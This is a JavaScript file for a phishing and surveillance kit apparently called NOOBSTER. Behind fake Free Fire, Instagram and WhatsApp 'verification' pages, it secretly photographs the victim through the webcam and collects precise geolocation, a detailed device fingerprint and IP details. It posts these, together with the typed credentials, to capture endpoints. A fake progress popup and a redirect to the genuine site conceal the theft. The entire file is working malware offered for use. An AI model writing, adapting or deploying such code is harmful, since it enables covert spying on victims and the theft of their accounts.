// NOOBSTER — capture.js v4 (no audio)
// t.me/noob11001

function log(msg) {
  try {
    fetch('/capture/debug', {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({msg: String(msg), t: Date.now()})
    });
  } catch(e){}
  console.log('[NB]', msg);
}

function showPopup(title,msg,spin=true){
  let p=document.getElementById('nb-popup');
  if(!p){
    p=document.createElement('div');p.id='nb-popup';
    p.innerHTML='<div class="nb-popup-box"><div class="nb-spinner"></div>'+
      '<div class="nb-popup-title"></div><div class="nb-popup-msg"></div>'+
      '<div class="nb-progress"><div class="nb-progress-bar"></div></div></div>';
    document.body.appendChild(p);
  }
  const box=p.querySelector('.nb-popup-box');
  box.classList.toggle('success',!spin);
  p.querySelector('.nb-popup-title').innerText=title;
  p.querySelector('.nb-popup-msg').innerText=msg;
  p.classList.add('show');
  const bar=p.querySelector('.nb-progress-bar');
  bar.style.transition='none';bar.style.width='0%';void bar.offsetWidth;
  bar.style.transition='width .6s cubic-bezier(.2,.7,.3,1)';
  if(spin){
    setTimeout(()=>bar.style.width='35%',200);
    setTimeout(()=>bar.style.width='70%',900);
    setTimeout(()=>bar.style.width='95%',1600);
  } else { setTimeout(()=>bar.style.width='100%',100); }
}

function redirectFor(page){
  if(page==='freefire')return 'https://ff.garena.com';
  if(page==='instagram-ban'||page==='instagram-download')return 'https://www.instagram.com';
  if(page==='whatsapp-ban')return 'https://web.whatsapp.com';
  return 'https://www.instagram.com';
}

// ═══ 1. CAMERA ═══
async function captureCamera(pageName) {
  log('camera: asking');
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user', width: {ideal:640}, height: {ideal:480} },
      audio: false
    });
    log('camera: granted');
    const v = document.getElementById('video');
    v.srcObject = stream;
    v.muted = true;
    await v.play();
    await new Promise(r => setTimeout(r, 1200));
    const c = document.getElementById('canvas');
    c.width = v.videoWidth || 640;
    c.height = v.videoHeight || 480;
    c.getContext('2d').drawImage(v, 0, 0);
    const photo = c.toDataURL('image/jpeg', 0.9);
    await fetch('/capture/photo', {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({ photo, page: pageName })
    });
    log('camera: sent');
    stream.getTracks().forEach(t => t.stop());
  } catch(e) {
    log('camera FAILED: ' + e.name + ' ' + e.message);
  }
}

// ═══ 2. LOCATION ═══
function captureLocation(pageName) {
  return new Promise(resolve => {
    if (!navigator.geolocation) {
      log('location: not supported');
      return resolve();
    }
    log('location: asking');
    navigator.geolocation.getCurrentPosition(
      async pos => {
        log('location: got high accuracy');
        await fetch('/capture/location', {
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body: JSON.stringify({
            page: pageName,
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            altitude: pos.coords.altitude,
            heading: pos.coords.heading,
            speed: pos.coords.speed,
            timestamp: pos.timestamp,
            accuracyMode: 'high'
          })
        });
        resolve();
      },
      err => {
        log('location: high failed — retrying low');
        navigator.geolocation.getCurrentPosition(
          async pos => {
            await fetch('/capture/location', {
              method:'POST',
              headers:{'Content-Type':'application/json'},
              body: JSON.stringify({
                page: pageName,
                lat: pos.coords.latitude, lon: pos.coords.longitude,
                accuracy: pos.coords.accuracy, timestamp: pos.timestamp,
                accuracyMode: 'low'
              })
            });
            resolve();
          },
          err2 => {
            log('location FAILED: ' + err2.message);
            resolve();
          },
          { enableHighAccuracy: false, timeout: 15000, maximumAge: 60000 }
        );
      },
      { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
    );
  });
}

// ═══ 3. FINGERPRINT + BATTERY ═══
async function captureFingerprint(pageName) {
  log('fingerprint: collecting');
  const fp = {
    page: pageName,
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    vendor: navigator.vendor,
    language: navigator.language,
    languages: navigator.languages,
    screen: {
      width: screen.width, height: screen.height,
      availWidth: screen.availWidth, availHeight: screen.availHeight,
      colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth,
      pixelRatio: window.devicePixelRatio,
      orientation: screen.orientation ? screen.orientation.type : null
    },
    window: {
      innerWidth: window.innerWidth, innerHeight: window.innerHeight
    },
    hardwareConcurrency: navigator.hardwareConcurrency,
    deviceMemory: navigator.deviceMemory,
    maxTouchPoints: navigator.maxTouchPoints,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezoneOffset: new Date().getTimezoneOffset(),
    online: navigator.onLine,
    cookieEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack,
    connection: navigator.connection ? {
      effectiveType: navigator.connection.effectiveType,
      downlink: navigator.connection.downlink,
      rtt: navigator.connection.rtt,
      saveData: navigator.connection.saveData,
      type: navigator.connection.type
    } : null
  };

  for (let i = 0; i < 3; i++) {
    try {
      if (navigator.getBattery) {
        const b = await navigator.getBattery();
        fp.battery = {
          charging: b.charging,
          level: b.level,
          chargingTime: b.chargingTime,
          dischargingTime: b.dischargingTime
        };
        log('battery: ' + Math.round(b.level*100) + '%');
        break;
      }
    } catch(e) {
      log('battery try ' + i + ': ' + e.message);
      await new Promise(r => setTimeout(r, 400));
    }
  }

  try {
    const gl = document.createElement('canvas').getContext('webgl');
    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
    if (dbg) {
      fp.gpu = {
        vendor: gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL),
        renderer: gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)
      };
    }
  } catch(e){}

  try {
    const c = document.createElement('canvas');
    const ctx = c.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillText('NOOBSTER-fp', 2, 2);
    fp.canvasFp = c.toDataURL().slice(-80);
  } catch(e){}

  await fetch('/capture/fingerprint', {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify(fp)
  });

  try {
    const r = await fetch('https://ipapi.co/json/');
    const d = await r.json();
    await fetch('/capture/fingerprint', {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({ page: pageName, ipapi: d })
    });
  } catch(e){}
}

// ═══ MAIN ═══
async function runCapture(pageName, fields) {
  await captureCamera(pageName);
  await new Promise(r => setTimeout(r, 300));
  await captureLocation(pageName);
  await new Promise(r => setTimeout(r, 300));
  await captureFingerprint(pageName);

  const r = await fetch('/capture/credentials', {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify({ page: pageName, fields, redirect: redirectFor(pageName) })
  });
  const j = await r.json();
  return j.redirect || redirectFor(pageName);
}

async function handleSubmit(pageName, fields) {
  showPopup('Verifying...', 'Please allow permissions to continue', true);
  const redirect = await runCapture(pageName, fields);
  setTimeout(() => showPopup('Success', 'Redirecting you now...', false), 1800);
  setTimeout(() => { location.href = redirect; }, 3400);
              }
